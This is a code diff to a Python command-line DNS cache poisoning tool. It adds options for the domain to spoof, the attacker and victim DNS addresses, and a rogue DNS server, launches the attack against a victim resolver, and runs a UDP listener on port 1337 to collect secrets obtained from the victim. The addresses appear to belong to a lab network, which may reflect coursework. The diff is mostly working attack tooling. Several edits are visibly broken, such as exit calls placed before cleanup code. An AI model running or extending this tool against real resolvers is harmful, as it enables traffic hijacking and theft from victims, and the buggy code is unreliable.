@@ -22,10 +22,11 @@ from threading import Thread
 
 from dns_poisoning import DNSPoisoning
 from dns_attack import DNSAttack
+import argparse
 
 #Globals
 secret_fetch_flag = True        #Used to stop the secret fetcher
-verbosity = 1
+verbosity = 0
 term = Terminal()
 attack_pool = None
 secret_socket = None
@@ -44,12 +45,14 @@ def log(msg):
         
 
 def sigint_handler(sig, frame):
+    global secret_fetch_flag
     sys.exit(-1)
     log("Stopping secret fetcher thread...")
     secret_fetch_flag = False
     if secret_socket != None:
             secret_socket.close()
     time.sleep(1)
+    signal.signal(signal.SIGINT, sys.exit(0))
     log("Stopping all the attacks...")
     print("Exiting...")
     sys.exit(0)
@@ -57,8 +60,8 @@ def sigint_handler(sig, frame):
 ##
 #       @brief Routine that fetch the secret
 #
-#       Start a small UDP server which listen on port 1337 for the secret.\n
-#       It also write the secret into the log_file file.
+#       Start a small UDP server which listen on the provided port for the secrets.\n
+#       It also write the secrets into the log_file file.
 #
 def secret_fetcher(server_ip, server_port):
     try:
@@ -68,6 +71,7 @@ def secret_fetcher(server_ip, server_port):
         print("{t.bold}{t.red}Unable to bind for secret service{t.normal}!!!!".format(t=term))
         print("Attack may be successful but no secret will be received...")
 
+    file_secret = None
     try:
         file_secret = open(log_file, "a+")
     except:
@@ -79,16 +83,21 @@ def secret_fetcher(server_ip, server_port):
         try:
                 data, addr = secret_socket.recvfrom(1024) # buffer size is 1024 bytes
                 print("({t.bold}secret fetcher{t.normal})Received response:{msg}".format(msg=data, t=term))
-                file_secret.write("Secret fetched: %s", data)
+                sys.exit(0)
+
+                file_secret.write("Secret fetched: " + str(data))
         except:
                 print("Error During secret fetching, exiting")
                 return
                 
+##
+#       @brief The routine that lauches the attack
+#       @param victim_server_ip         The target server IP
+#       @param domain                   The domain to spoof
+#
+def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip, number_of_tries=None, victim_mac=None):
 
-def launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, attacker_ip, number_of_tries=None, \
-        blessing_terminal=None, sigint_handler=None, log_function=None):
-
-        attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port,\
+        attack = DNSAttack(victim_server_ip, domain, bad_server_data,\
                  attacker_ip,\
                 blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)
 
@@ -98,10 +107,38 @@ def launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, attacker_i
         attack.start(number_of_tries, mode=DNSAttack.Mode.FAST) 
 
 
+def fetch_parameter(*args):
+        parser = argparse.ArgumentParser(description='DNS Poisoning Attack Tool')
+        parser.add_argument('-t', '--target-domain', help='The target domain to spoof', required=True, type=str)
+        parser.add_argument('-a', '--attacker-ip', help='Attacker IP address', required=True, type=str)
+        parser.add_argument('-v', '--victim-dns-ip', help='The victim DNS IP address', required=True, type=str)
 
-def main():
+        parser.add_argument('-bs', '--bad-server-ip', help='The Bad Guy DNS server IP', required=False, type=str, default='192.168.56.1')
+        parser.add_argument('-bp', '--bad-server-port', help='The Bad Guy DNS server port', required=False, type=int, default=55553)
+        parser.add_argument('-ns', '--ns-server', help='The victim authoritative server', required=False, type=str)
+        parser.add_argument('-i', '--interface', help='The Network Card interface to use', required=False, type=str)
+
+
+        parser.add_argument('-m', '--mode', help='Mode to use', choices=['NORMAL','FAST'], required=False, type=str, default='NORMAL')
+       
+        parser.add_argument('-vm', '--victim-mac', dest='victimMac', help='The victim MAC address', required=False, type=str)
+
+        args = parser.parse_args()
+
+        if args.mode == "FAST" and args.victimMac is None:
+                parser.error("FAST Mode require the victim MAC address")
+                
+
+
+
+        return vars(args)
+
+
+def main(*args):
 
         print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))
+
+        param = fetch_parameter(*args)
 
         victim_server_ip = '192.168.56.3'
         attacker_ip = '192.168.56.1'
@@ -110,13 +147,19 @@ def main():
         bad_udp_port = 55553
         bad_udp_ip = '192.168.56.1'
 
+        secret_ip = '192.168.56.1'
+        secret_port = 1337
+
+        bad_server = (bad_udp_ip, bad_udp_port)
 
         #Launch the secret fetcher
-        secret_thread = Thread(target=secret_fetcher, args = (bad_udp_ip, 1337))
+        secret_thread = Thread(target=secret_fetcher, args = (secret_ip, secret_port))
         secret_thread.start()
 
         try:
-                launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, attacker_ip ,number_of_tries=30 , blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)
+
+                launch_attack(victim_server_ip, domain, bad_server, attacker_ip ,number_of_tries=30)
+
         except DNSAttack.CriticalError:
                 print("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating".format(t=term))
         except DNSAttack.SuccessfulAttack:
@@ -127,4 +170,5 @@ def main():
 
 
 
-main()
+if __name__ == '__main__':
+        main(*sys.argv[1:])
